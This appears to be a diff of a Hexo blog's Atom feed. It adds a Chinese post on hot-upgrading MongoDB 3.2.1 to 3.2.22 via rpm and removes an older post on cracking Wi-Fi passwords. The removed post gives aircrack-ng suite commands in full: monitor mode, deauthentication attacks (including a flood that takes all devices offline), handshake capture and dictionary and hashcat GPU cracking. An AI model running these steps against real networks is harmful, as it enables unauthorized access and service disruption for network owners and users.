@@ -6,7 +6,7 @@
   <link href="https://www.langxw.com/atom.xml" rel="self"/>
   
   <link href="https://www.langxw.com/"/>
-  <updated>2021-04-13T12:50:14.357Z</updated>
+  <updated>2021-04-14T02:11:44.561Z</updated>
   <id>https://www.langxw.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Mongodb小版本热升级</title>
+    <link href="https://www.langxw.com/2021/04/14/Mongodb%E5%B0%8F%E7%89%88%E6%9C%AC%E7%83%AD%E5%8D%87%E7%BA%A7/"/>
+    <id>https://www.langxw.com/2021/04/14/Mongodb%E5%B0%8F%E7%89%88%E6%9C%AC%E7%83%AD%E5%8D%87%E7%BA%A7/</id>
+    <published>2021-04-14T02:10:43.000Z</published>
+    <updated>2021-04-14T02:11:44.561Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="一、缘由"><a href="#一、缘由" class="headerlink" title="一、缘由"></a>一、缘由</h2><p>我司一个系统中用到mongodb 3.2.1版本，但是漏扫软件扫出来有重大漏洞，需要打补丁（升级版本）。</p><p>部署3.2的最后一个版本3.2.22后，经扫描没有漏洞，同时业务系统也支持3.2.22版本，决定采用mongodb 3.2.22版本。</p><p><strong>环境：Centos 7.6 + rpm包方式安装的mongo 3.2.1</strong></p><h2 id="二、热升级"><a href="#二、热升级" class="headerlink" title="二、热升级"></a>二、热升级</h2><p><strong>注意：热升级仅支持小版本的升级，跨大版本的升级，请严格按照停机备份还原的方法来。</strong></p><pre><code class="shell">rpm -Fvh mongodb-org-server-3.2.22-1.el7.x86_64.rpm    --nodepsrpm -Fvh mongodb-org-tools-3.2.22-1.el7.x86_64.rpm    --nodepsrpm -Fvh mongodb-org-mongos-3.2.22-1.el7.x86_64.rpm    --nodepsrpm -Fvh mongodb-org-shell-3.2.22-1.el7.x86_64.rpm    --nodepsrpm -Fvh mongodb-org-3.2.22-1.el7.x86_64.rpm --nodepssystemctl daemon-reload</code></pre><h2 id="三、验证"><a href="#三、验证" class="headerlink" title="三、验证"></a>三、验证</h2><ul><li>运维使用客户端或命令行，进行一些版本或数据查询的验证</li><li>主要还是要观察业务是否可用</li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;一、缘由&quot;&gt;&lt;a href=&quot;#一、缘由&quot; class=&quot;headerlink&quot; title=&quot;一、缘由&quot;&gt;&lt;/a&gt;一、缘由&lt;/h2&gt;&lt;p&gt;我司一个系统中用到mongodb 3.2.1版本，但是漏扫软件扫出来有重大漏洞，需要打补丁（升级版本）。&lt;/p&gt;
+&lt;p&gt;部署</summary>
+      
+    
+    
+    
+    <category term="数据库" scheme="https://www.langxw.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
+    
+    <category term="MongoDB" scheme="https://www.langxw.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/MongoDB/"/>
+    
+    
+    <category term="mongodb" scheme="https://www.langxw.com/tags/mongodb/"/>
+    
+  </entry>
   
   <entry>
     <title>基于SSH服务的SFTP应用</title>
@@ -547,35 +574,6 @@
     
     
     <category term="win10" scheme="https://www.langxw.com/tags/win10/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Wifi密码破解</title>
-    <link href="https://www.langxw.com/2021/02/02/Wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
-    <id>https://www.langxw.com/2021/02/02/Wifi%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</id>
-    <published>2021-02-02T02:02:18.000Z</published>
-    <updated>2021-03-16T12:01:03.441Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="1、关闭网络和会影响到破解的进程"><a href="#1、关闭网络和会影响到破解的进程" class="headerlink" title="1、关闭网络和会影响到破解的进程"></a>1、关闭网络和会影响到破解的进程</h2><ol><li><code>service net-manager stop</code> 关闭网络功能</li><li> <code>airmon-ng check kill</code> 关闭相关进程</li></ol><h2 id="2、打开网络监听"><a href="#2、打开网络监听" class="headerlink" title="2、打开网络监听"></a>2、打开网络监听</h2><ol><li><code>iwconfig</code> 命令查看本机的网卡，可以看到无线网卡wlan0</li><li><code>airmon-ng</code> 命令列出支持监控模式的无线网卡，如没有输出，则表示本机无线网卡不支持监控模式。</li><li> <code>airmon-ng start wlan0</code> 打开网络监听，wlan0为你的无线网卡名称。如果有报错<code>Operation not possible due to RF-kill</code>，则手动关掉wifid的soft blocked，<code>rfkill list</code> , <code>rfkill unblock 2</code>。</li><li><code>airodump-ng wlan0mon</code> 监听所有wifi， wlan0mon 也可能是mon0，并记录BSSID, CH, ESSID, 考虑data列有数据的WIFI。BSSID是路由器的MAC地址，CH路由器WIFI频道，ESSID为WIFI的名字，<strong>窗口1</strong>。</li><li><code>airodump-ng --bssid xx:xx:xx:xx:xx:xx -c 1 -w ~/Desktop/cap/xxx.cap  wlan0mon</code> 监听特定的频道，不要结束此进程，不要关掉此窗口，<strong>窗口2</strong>。</li><li><code>aireplay-ng -0 2 -a xx:xx:xx:xx:xx:xx -c xx:xx:xx:xx:xx:xx wlan0mon</code> 获取握手包数据，新开一个终端执行，当上一步时间后面出现WAP handshake时说明获取成功。需要多尝试几次  ，<strong>窗口3</strong>。 或者 <code>aireplay-ng -0 0 -a 28:6C:07:53:53:80 wlam0mon</code> 进行洪水攻击，不断攻击，让所有设备下线。</li><li><code>aircrack-ng -w 1.txt tmp-02.cap</code> 硬破解密码，1.txt是密码包，temp-02.cap是握手包。会执行很长时间，直到提示key fund！<strong>窗口4</strong></li><li><code>airmon-ng stop wlan0mon</code> 关闭网络监听。</li><li><code>service network-manager start</code> 打开网络。</li></ol><h2 id="3、附录："><a href="#3、附录：" class="headerlink" title="3、附录："></a>3、附录：</h2><h3 id="1、使用显卡的运算能力"><a href="#1、使用显卡的运算能力" class="headerlink" title="1、使用显卡的运算能力"></a>1、使用显卡的运算能力</h3><p>如果你有一个强大的GPU，为什么不使用GPU跑字典呢？<br>Hashcat可以借助GPU的运算力破解各种不同算法的hash值。<br>下载时要注意选择正确的显卡类型（AMD、NVidia）。Kali Linux自带这个工具。<br>在破解cap文件之前，要把它转换为hccap文件：</p><p><code>aircrack-ng file.cap -J out.hccap</code></p><p>使用GPU破解hash：</p><p><code>hashcat -m 2500 out.hccap 字典文件</code></p><h3 id="2、参考链接："><a href="#2、参考链接：" class="headerlink" title="2、参考链接："></a>2、参考链接：</h3><p><a href="https://blog.csdn.net/GrayOnDream/article/details/51859688?locationNum=13">https://blog.csdn.net/GrayOnDream/article/details/51859688?locationNum=13</a></p><p><a href="https://blog.csdn.net/qq_37367124/article/details/79587713">https://blog.csdn.net/qq_37367124/article/details/79587713</a></p><p><a href="https://www.cnblogs.com/daoyi/p/Kali-Linux-shi-yongAircrack-po-jiewifi-mi-ma-wpawp.html">https://www.cnblogs.com/daoyi/p/Kali-Linux-shi-yongAircrack-po-jiewifi-mi-ma-wpawp.html</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;1、关闭网络和会影响到破解的进程&quot;&gt;&lt;a href=&quot;#1、关闭网络和会影响到破解的进程&quot; class=&quot;headerlink&quot; title=&quot;1、关闭网络和会影响到破解的进程&quot;&gt;&lt;/a&gt;1、关闭网络和会影响到破解的进程&lt;/h2&gt;&lt;ol&gt;
-&lt;li&gt;&lt;code&gt;se</summary>
-      
-    
-    
-    
-    <category term="工具" scheme="https://www.langxw.com/categories/%E5%B7%A5%E5%85%B7/"/>
-    
-    <category term="破解" scheme="https://www.langxw.com/categories/%E5%B7%A5%E5%85%B7/%E7%A0%B4%E8%A7%A3/"/>
-    
-    
-    <category term="aircrack-ng" scheme="https://www.langxw.com/tags/aircrack-ng/"/>
-    
-    <category term="arimon-ng" scheme="https://www.langxw.com/tags/arimon-ng/"/>
     
   </entry>
   
